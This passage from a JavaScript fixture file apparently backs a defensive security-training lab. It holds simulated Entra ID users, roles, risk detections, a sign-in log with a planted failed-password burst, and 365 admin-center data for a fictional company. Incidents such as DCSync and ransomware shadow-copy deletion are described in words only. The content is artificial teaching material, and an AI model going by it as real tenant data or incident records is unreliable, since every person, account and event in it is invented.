    lastSignIn:'2026-06-28T10:11:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'Insider risk case IR-2044 — departing employee policy',
    roles:[], licenses:['365 E5'], devices:1, groups:4,
    xdrIdentity:null, incidentId:null },
  { upn:'m.okafor@hacksmarterlabs.example', displayName:'Michael Okafor', jobTitle:'Threat Analyst', department:'Security Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2024-12-01T00:00:00Z',
    lastSignIn:'2026-06-28T13:50:00Z', mfa:'Passkey (FIDO2)', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:['Security Reader'], licenses:['365 E5','Security Copilot'], devices:1, groups:6,
    xdrIdentity:null, incidentId:null },
  { upn:'r.vance@hacksmarterlabs.example', displayName:'Rachel Vance', jobTitle:'SOC Manager', department:'Security Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2023-09-18T00:00:00Z',
    lastSignIn:'2026-06-28T12:35:00Z', mfa:'Passkey (FIDO2)', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:['Security Operator','Security Administrator (PIM eligible)'], licenses:['365 E5','Security Copilot'], devices:2, groups:9,
    xdrIdentity:null, incidentId:null },
  { upn:'tchen@hacksmarterlabs.example', displayName:'Tara Chen', jobTitle:'Corporate Counsel', department:'Legal',
    userType:'Member', enabled:true, source:'Cloud only', created:'2024-07-07T00:00:00Z',
    lastSignIn:'2026-06-27T18:02:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'eDiscovery reviewer on CASE-2406-1042',
    roles:['eDiscovery Manager'], licenses:['365 E5'], devices:1, groups:3,
    xdrIdentity:null, incidentId:null },
  { upn:'mrivera@hacksmarterlabs.example', displayName:'Marco Rivera', jobTitle:'Marketing Manager', department:'Marketing',
    userType:'Member', enabled:true, source:'Cloud only', created:'2025-02-11T00:00:00Z',
    lastSignIn:'2026-06-28T09:41:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:[], licenses:['365 E3'], devices:1, groups:2,
    xdrIdentity:null, incidentId:null },
  { upn:'j.reyes@hacksmarterlabs.example', displayName:'Jordan Reyes', jobTitle:'Controller', department:'Finance',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2023-12-04T00:00:00Z',
    lastSignIn:'2026-06-28T08:12:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'Owner of the Finance file share on FIN-FS-02',
    roles:[], licenses:['365 E5'], devices:1, groups:5,
    xdrIdentity:null, incidentId:null },
  { upn:'lee.helpdesk@hacksmarterlabs.example', displayName:'Helpdesk (Lee)', jobTitle:'Service Desk Technician', department:'IT Operations',
    userType:'Member', enabled:true, source:'Windows Server AD (synced)', created:'2024-10-21T00:00:00Z',
    lastSignIn:'2026-06-28T07:30:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:['Helpdesk Administrator'], licenses:['365 E3'], devices:1, groups:4,
    xdrIdentity:null, incidentId:null },
  { upn:'admin.tier0@hacksmarterlabs.example', displayName:'Tier-0 Admin', jobTitle:'Enterprise Administrator', department:'IT Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2023-08-01T00:00:00Z',
    lastSignIn:'2026-06-28T14:05:00Z', mfa:'Passkey (FIDO2)', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'Break-glass-adjacent admin; excluded from risk-based CA by design',
    roles:['Global Administrator'], licenses:['365 E5'], devices:1, groups:7,
    xdrIdentity:null, incidentId:null },
  { upn:'cloudadmin@hacksmarterlabs.example', displayName:'Cloud Admin', jobTitle:'Cloud Platform Administrator', department:'IT Operations',
    userType:'Member', enabled:true, source:'Cloud only', created:'2023-08-01T00:00:00Z',
    lastSignIn:'2026-06-28T11:47:00Z', mfa:'Authenticator', sspr:true,
    riskState:'None', riskLevel:'None', riskDetail:'',
    roles:['Global Administrator'], licenses:['365 E5'], devices:1, groups:6,
    xdrIdentity:null, incidentId:null },
  { upn:'svc-backup@hacksmarterlabs.example', displayName:'svc-backup', jobTitle:'Backup service account', department:'IT Operations',
    userType:'Service principal', enabled:false, source:'Windows Server AD (synced)', created:'2023-09-12T00:00:00Z',
    lastSignIn:'2026-06-28T03:44:00Z', mfa:'Not registered', sspr:false,
    riskState:'Confirmed compromised', riskLevel:'High', riskDetail:'AdminSDHolder DACL write + DCSync from 10.20.4.55 — account disabled',
    roles:['Backup Operators (on-prem)'], licenses:[], devices:2, groups:3,
    xdrIdentity:'svc-backup@hacksmarterlabs.example', incidentId:'INC-1019' },
  { upn:'fin-svc@hacksmarterlabs.example', displayName:'fin-svc', jobTitle:'Finance file-server service account', department:'Finance',
    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2024-09-01T00:00:00Z',
    lastSignIn:'2026-06-28T10:20:00Z', mfa:'Not registered', sspr:false,
    riskState:'At risk', riskLevel:'High', riskDetail:'Launched locker.exe and vssadmin shadow-copy deletion on FIN-FS-02',
    roles:['Finance Share Owners'], licenses:[], devices:2, groups:2,
    xdrIdentity:'fin-svc@hacksmarterlabs.example', incidentId:'INC-1050' },
  { upn:'MSOL_AzureSync@hacksmarterlabs.example', displayName:'MSOL_AzureSync', jobTitle:'Directory synchronization (Entra Connect)', department:'Entra Connect',
    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2023-08-01T00:00:00Z',
    lastSignIn:'2026-06-28T15:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'Dismissed', riskLevel:'Informational', riskDetail:'DCSync from AAD-CONNECT-01 is expected — benign true positive',
    roles:['Directory Synchronization Accounts'], licenses:[], devices:1, groups:1,
    xdrIdentity:'MSOL_AzureSync@hacksmarterlabs.example', incidentId:'INC-1019' },
  { upn:'svc-scan@hacksmarterlabs.example', displayName:'svc-scan', jobTitle:'Vulnerability scanner service account', department:'Security Operations',
    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2024-02-02T00:00:00Z',
    lastSignIn:'2026-06-28T09:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'None', riskLevel:'Informational', riskDetail:'Runs scanner.exe on WKS-01/02 — source of the suppression-rule lab',
    roles:[], licenses:[], devices:3, groups:1,
    xdrIdentity:null, incidentId:null },
  { upn:'legacy.batch@hacksmarterlabs.example', displayName:'legacy-batch', jobTitle:'Nightly batch job', department:'Finance',
    userType:'Service principal', enabled:true, source:'Windows Server AD (synced)', created:'2023-08-15T00:00:00Z',
    lastSignIn:'2026-06-28T02:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'At risk', riskLevel:'Medium', riskDetail:'Still authenticating with legacy protocols — blocked by CA002',
    roles:[], licenses:[], devices:1, groups:1,
    xdrIdentity:null, incidentId:null },
  { upn:'krbtgt@hacksmarterlabs.example', displayName:'krbtgt', jobTitle:'KDC service account', department:'Active Directory',
    userType:'Service principal', enabled:false, source:'Windows Server AD (not synced)', created:'2023-08-01T00:00:00Z',
    lastSignIn:'2026-06-25T00:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'None', riskLevel:'Informational', riskDetail:'Tier-0 KDC account — watched for Golden Ticket / password rotation',
    roles:[], licenses:[], devices:0, groups:1,
    xdrIdentity:'krbtgt@hacksmarterlabs.example', incidentId:'INC-1019' },
  { upn:'partner.auditor@fabrikam.com', displayName:'Priya Raman (Fabrikam)', jobTitle:'External auditor', department:'—',
    userType:'Guest', enabled:true, source:'B2B invitation', created:'2026-05-04T00:00:00Z',
    lastSignIn:'2026-06-26T14:20:00Z', mfa:'Authenticator', sspr:false,
    riskState:'None', riskLevel:'None', riskDetail:'Guest scoped to the Finance audit SharePoint site',
    roles:[], licenses:[], devices:0, groups:1,
    xdrIdentity:null, incidentId:null },
  { upn:'svc-partner@hacksmarterlabs.example', displayName:'svc-partner', jobTitle:'Partner data feed', department:'Sales',
    userType:'Service principal', enabled:true, source:'Cloud only', created:'2025-06-10T00:00:00Z',
    lastSignIn:'2026-06-28T06:00:00Z', mfa:'Not registered', sspr:false,
    riskState:'None', riskLevel:'None', riskDetail:'Certificate credential expires 2026-09-01',
    roles:[], licenses:[], devices:0, groups:1,
    xdrIdentity:null, incidentId:null },
];

// Privileged role assignments surfaced on the Entra overview (PIM view).
const ENTRA_ROLE_ASSIGNMENTS = [
  { role:'Global Administrator',        active:2, eligible:0, members:['admin.tier0@hacksmarterlabs.example','cloudadmin@hacksmarterlabs.example'],
    note:'Two permanent assignments — Product guidance recommends 2–4 with phishing-resistant MFA.' },
  { role:'Security Administrator',      active:0, eligible:2, members:['olivia.kim@hacksmarterlabs.example','r.vance@hacksmarterlabs.example'],
    note:'PIM eligible only. Olivia Kim activated for 45 minutes under CHG-4821.' },
  { role:'Security Operator',           active:1, eligible:0, members:['r.vance@hacksmarterlabs.example'],
    note:'Standing assignment used for Defender XDR response actions.' },
  { role:'Security Reader',             active:1, eligible:0, members:['m.okafor@hacksmarterlabs.example'],
    note:'Read-only analyst access across Defender and Sentinel.' },
  { role:'Helpdesk Administrator',      active:1, eligible:0, members:['lee.helpdesk@hacksmarterlabs.example'],
    note:'Can reset passwords for non-admin users — a common attacker target.' },
  { role:'eDiscovery Manager',          active:1, eligible:0, members:['tchen@hacksmarterlabs.example'],
    note:'Purview eDiscovery (Premium) case owner.' },
  { role:'Directory Synchronization Accounts', active:1, eligible:0, members:['MSOL_AzureSync@hacksmarterlabs.example'],
    note:'Service role. Replication is expected — do not treat its DCSync as malicious.' },
];

// Risk detections aggregated for the last 7 days (Entra ID Protection).
const ENTRA_RISK_DETECTION_SUMMARY = [
  { type:'Unfamiliar sign-in properties', count:14, level:'High',   trend:'+6' },
  { type:'Anonymous IP address',          count:9,  level:'Medium', trend:'+4' },
  { type:'Impossible travel',             count:6,  level:'Medium', trend:'+2' },
  { type:'Adversary-in-the-middle',       count:3,  level:'High',   trend:'+3' },
  { type:'Password spray',                count:3,  level:'Medium', trend:'+1' },
  { type:'Leaked credentials',            count:2,  level:'High',   trend:'0' },
  { type:'Malicious IP address',          count:2,  level:'Medium', trend:'-1' },
  { type:'Token replay',                  count:1,  level:'High',   trend:'+1' },
];

// Recent risky sign-ins across the tenant (feeds the overview activity card).
const ENTRA_RECENT_SIGNINS = [
  { time:'2026-06-28T13:33:00Z', user:'sam.lee@hacksmarterlabs.example',    app:'Azure Portal',                 ip:'91.219.236.54',  location:'Amsterdam, NL', result:'Blocked by CA', risk:'High',   ca:'CA003 - Risky sign-in MFA' },
  { time:'2026-06-28T13:27:00Z', user:'sam.lee@hacksmarterlabs.example',    app:'Exchange Online',              ip:'91.219.236.54',  location:'Amsterdam, NL', result:'Success',       risk:'High',   ca:'Not applied' },
  { time:'2026-06-28T10:20:00Z', user:'fin-svc@hacksmarterlabs.example',    app:'Windows SMB (on-prem)',        ip:'10.20.4.55',     location:'Redmond, US',   result:'Success',       risk:'High',   ca:'Not applied' },
  { time:'2026-06-28T09:05:00Z', user:'jordan.wong@hacksmarterlabs.example',  app:'Hack Smarter Travel',               ip:'76.21.55.4',     location:'Seattle, US',   result:'Success',       risk:'Low',    ca:'CA001 satisfied' },
  { time:'2026-06-28T08:30:00Z', user:'jane.doe@hacksmarterlabs.example',   app:'DocViewer Pro',                ip:'185.199.111.12', location:'Ashburn, US',   result:'Success',       risk:'High',   ca:'Not applied' },
  { time:'2026-06-28T06:44:00Z', user:'maria.ross@hacksmarterlabs.example', app:'SharePoint Online',            ip:'185.199.111.12', location:'Ashburn, US',   result:'Interrupted',   risk:'High',   ca:'CA003 - Risky sign-in MFA' },
  { time:'2026-06-28T04:12:00Z', user:'liam.chen@hacksmarterlabs.example',  app:'365 portal',         ip:'203.0.113.74',   location:'Unknown',       result:'Failure',       risk:'Medium', ca:'Not applied' },
  { time:'2026-06-28T03:44:00Z', user:'svc-backup@hacksmarterlabs.example', app:'Windows LDAP (on-prem)',       ip:'10.20.4.55',     location:'Redmond, US',   result:'Success',       risk:'High',   ca:'Not applied' },
  { time:'2026-06-28T02:00:00Z', user:'legacy.batch@hacksmarterlabs.example', app:'IMAP4 (legacy auth)',        ip:'10.20.9.10',     location:'Redmond, US',   result:'Blocked by CA', risk:'Medium', ca:'CA002 - Block legacy auth' },
];

// The four sign-in log types a real identity platform separates. Only the
// interactive log carries lab evidence; the rest exist so a student learns that
// "the sign-in log" is really four logs, and that a human-typed password is
// only one of the ways an identity authenticates.
const SIGNIN_LOG_TYPES = [
  { key:'interactive',      label:'User sign-ins (interactive)',
    empty:'' },
  { key:'noninteractive',   label:'User sign-ins (non-interactive)',
    empty:'Sign-ins performed by a client on behalf of a user, with no one typing a password — refresh tokens, background mail sync. High volume, sampled.' },
  { key:'serviceprincipal', label:'Service principal sign-ins',
    empty:'Applications and service principals authenticating with their own credentials rather than as a user. No device or browser is involved.' },
  { key:'managedidentity',  label:'Managed identity sign-ins',
    empty:'Platform-managed identities assigned to cloud resources. Credentials are rotated by the platform and never handled by a person.' },
];

// Raw sign-in log for #/entra/sign-in-logs — the evidence table Module 01 sends
// a first-time student to read. Deliberately unsorted-looking and mixed with
// benign traffic: the failure burst is findable, but only by filtering. Nothing
// in the rows states a verdict; the analyst supplies that.
//
// `id` values are stable so the coach can spotlight specific rows by selector.
const SIGNIN_LOG_EVENTS = [
  { id:'SL-020', time:'2026-06-28T09:14:22Z', user:'m.okafor@hacksmarterlabs.example', display:'Miriam Okafor',
    app:'365 portal', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-2104 (managed)',
    client:'Browser — Edge 139', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied' },
  { id:'SL-019', time:'2026-06-28T09:09:41Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Not prompted',
    risk:'High', ca:'Not applied', flag:'success' },
  { id:'SL-018', time:'2026-06-28T09:08:55Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'High', ca:'Not applied', flag:'fail' },
  { id:'SL-017', time:'2026-06-28T09:08:02Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'High', ca:'Not applied', flag:'fail' },
  { id:'SL-016', time:'2026-06-28T09:07:10Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Medium', ca:'Not applied', flag:'fail' },
  { id:'SL-015', time:'2026-06-28T09:06:19Z', user:'t.arnold@hacksmarterlabs.example', display:'Tom Arnold',
    app:'Exchange Online', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-1877 (managed)',
    client:'Outlook desktop', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied' },
  { id:'SL-014', time:'2026-06-28T09:05:44Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Medium', ca:'Not applied', flag:'fail' },
  { id:'SL-013', time:'2026-06-28T09:04:51Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Medium', ca:'Not applied', flag:'fail' },
  { id:'SL-012', time:'2026-06-28T09:03:58Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Low', ca:'Not applied', flag:'fail' },
  { id:'SL-011', time:'2026-06-28T09:03:04Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Low', ca:'Not applied', flag:'fail' },
  { id:'SL-010', time:'2026-06-28T09:02:11Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'185.220.101.24', location:'Bucharest, RO', device:'Unmanaged — not registered',
    client:'Browser — Chrome 141', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'Low', ca:'Not applied', flag:'fail' },
  { id:'SL-009', time:'2026-06-28T08:58:37Z', user:'r.beck@hacksmarterlabs.example', display:'Rina Beck',
    app:'SharePoint Online', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-2290 (managed)',
    client:'Browser — Edge 139', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied' },
  { id:'SL-008', time:'2026-06-28T08:41:16Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-2291 (managed)',
    client:'Browser — Edge 139', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied', flag:'baseline' },
  // The control case: one failure then a success, same managed laptop, same
  // office IP. A student who calls this an attack has learned the pattern
  // without the context, which is the mistake Module 01 is built to prevent.
  { id:'SL-007', time:'2026-06-28T08:23:11Z', user:'t.arnold@hacksmarterlabs.example', display:'Tom Arnold',
    app:'365 portal', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-1877 (managed)',
    client:'Browser — Edge 139', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied' },
  { id:'SL-006', time:'2026-06-28T08:22:49Z', user:'t.arnold@hacksmarterlabs.example', display:'Tom Arnold',
    app:'365 portal', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-1877 (managed)',
    client:'Browser — Edge 139', result:'Failure', code:'50126', detail:'Invalid username or password', mfa:'Not reached',
    risk:'None', ca:'Not applied' },
  { id:'SL-005', time:'2026-06-27T17:02:30Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'Exchange Online', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-2291 (managed)',
    client:'Outlook desktop', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied', flag:'baseline' },
  { id:'SL-004', time:'2026-06-27T08:37:05Z', user:'j.santos@hacksmarterlabs.example', display:'Julia Santos',
    app:'365 portal', ip:'91.63.14.22', location:'Berlin, DE', device:'HSL-LT-2291 (managed)',
    client:'Browser — Edge 139', result:'Success', code:'0', detail:'Sign-in successful', mfa:'Authenticator',
    risk:'None', ca:'CA001 satisfied', flag:'baseline' },
];

// Tenant posture recommendations shown alongside the identity secure score.
const ENTRA_RECOMMENDATIONS = [
  { title:'Require phishing-resistant MFA for privileged roles', impact:'High',   status:'Not started',
    detail:'2 Global Administrators hold standing assignments; only one uses a passkey.' },
  { title:'Register all users for MFA and SSPR',                 impact:'High',   status:'In progress',
    detail:'3 members are unregistered (liam.chen, mfoster, jdoe) — risk policies cannot self-remediate them.' },
  { title:'Enable a sign-in risk-based Conditional Access policy', impact:'High', status:'Not started',
    detail:'Build CA003 in the Conditional Access lab so High sign-in risk prompts MFA instead of going unchallenged.' },
  { title:'Move standing admin roles to PIM eligible',           impact:'Medium', status:'In progress',
    detail:'Security Administrator is already eligible-only; Global Administrator is not.' },
  { title:'Review service principals with stale credentials',    impact:'Medium', status:'Not started',
    detail:'svc-partner certificate expires 2026-09-01; legacy-batch still uses legacy protocols.' },
];
// === end Entra tenant directory ===

// ===================== 365 admin center =====================
// Supporting tenant-administration fixtures. These reuse ENTRA_USERS for the
// directory itself so identity, licensing, Defender, and Purview pivots all
// refer to the same fictional Hack Smarter Labs principals.
const M365_ADMIN_TENANT = {
  name:'Hack Smarter Labs', domain:'hacksmarterlabs.example', view:'Dashboard view',
  release:'Standard release', region:'North America',
};

const M365_LICENSE_PRODUCTS = [
  { product:'365 E5', purchased:30, assigned:13, status:'Active', renewal:'2027-01-01' },
  { product:'365 E3', purchased:20, assigned:7,  status:'Active', renewal:'2027-01-01' },
  { product:'Security Copilot', purchased:6, assigned:2,   status:'Active', renewal:'2026-12-01' },
];

const M365_USAGE_REPORTS = [
  { product:'Teams', enabled:20, active:18, period:'Last 30 days' },
  { product:'Exchange Online', enabled:20, active:19, period:'Last 30 days' },
  { product:'SharePoint',      enabled:20, active:16, period:'Last 30 days' },
  { product:'OneDrive',        enabled:20, active:17, period:'Last 30 days' },
  { product:'365 Apps', enabled:20, active:19, period:'Last 30 days' },
];

const M365_SERVICE_HEALTH = [
  { service:'Exchange Online', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:45:00Z' },
  { service:'Teams', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:44:00Z' },
  { service:'SharePoint Online', status:'Advisory', detail:'Some users may see delayed search indexing', updated:'2026-08-02T18:37:00Z' },
  { service:'Entra ID', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:42:00Z' },
  { service:'Purview', status:'Healthy', detail:'No active issues', updated:'2026-08-02T18:40:00Z' },
];

const M365_MESSAGE_CENTER = [
  {
    id:'MC1084211', title:'Review authentication method registration', service:'Entra',
    impact:'Action required', tag:'Admin impact', category:'Prevent or fix issues', relevance:'High',
    published:'2026-07-31', updated:'2026-08-01', timing:'August 2026', due:'2026-08-15',
    platform:'Web', orgStatus:'Action recommended', monthlyUsers:20,
    whatWhy:'Hack Smarter Labs should review users who have not registered a strong authentication method before the next registration campaign.',
    rollout:'The tenant review is available now. The fictional campaign begins August 18 and is evaluated in phases through August 29.',
    orgImpact:'Three active members in the lab directory have no registered MFA method. They can be prompted during sign-in and might contact the help desk.',
    actions:['Review the unregistered-user list in Entra.', 'Notify the help desk about the registration prompt.', 'Confirm break-glass accounts are excluded from the campaign.'],
    compliance:'No new tenant data location is introduced. Authentication registration records remain governed by existing identity access and audit controls.',
  },
  {
    id:'MC1083904', title:'New usage report export fields', service:'365 admin center',
    impact:'Plan for change', tag:'Feature update', category:'Plan for change', relevance:'Medium',
    published:'2026-07-30', updated:'2026-07-30', timing:'Late August 2026', due:'2026-08-28',
    platform:'Web and CSV export', orgStatus:'Planned', monthlyUsers:4,
    whatWhy:'Usage report exports will include additional activity and reporting-period fields so administrators can interpret exported totals without a separate lookup.',
    rollout:'Targeted release starts August 20. Standard release is planned to complete by September 4.',
    orgImpact:'Existing export automation that assumes a fixed column order could fail when the new fields appear. The on-screen reports are unchanged.',
    actions:['Review scripts that parse usage-report CSV files.', 'Prefer column names instead of numeric column positions.', 'Tell report owners when the revised schema reaches the tenant.'],
    compliance:'Exports can contain usage metadata. Continue storing exported files in an access-controlled location and apply the organization retention policy.',
  },
  {
    id:'MC1082710', title:'SharePoint search experience update', service:'SharePoint Online',
    impact:'Stay informed', tag:'Major update', category:'Plan for change', relevance:'Medium',
    published:'2026-07-28', updated:'2026-08-01', timing:'September 2026', due:'2026-09-04',
    platform:'Web', orgStatus:'Scheduled', monthlyUsers:16,
    whatWhy:'The SharePoint search results experience is being refreshed to make filters and result context easier to use.',
    rollout:'Targeted release begins September 7. Standard release follows in phases and is expected to finish September 25.',
    orgImpact:'Users will see updated result controls and might need revised help-desk guidance. Search permissions and indexed content are not changed by this lab announcement.',
    actions:['Brief support staff on the visual change.', 'Update internal search screenshots after rollout.', 'Validate common search journeys with the pilot group.'],
    compliance:'The change does not alter configured permissions, retention, eDiscovery, or DLP behavior in this fictional scenario.',
  },
];

const M365_SETUP_TASKS = [
  { title:'Protect admin accounts with phishing-resistant MFA', category:'Sign-in security', status:'In progress', route:'#/entra/conditional-access' },
  { title:'Review data loss prevention coverage', category:'Data protection', status:'Available', route:'#/purview/dlp' },
  { title:'Review service health notification preferences', category:'Operations', status:'Available', route:'#/m365-admin/service-health' },
  { title:'Validate 365 license assignments', category:'Licensing', status:'Available', route:'#/m365-admin/licenses' },
];
// === end 365 admin center ===
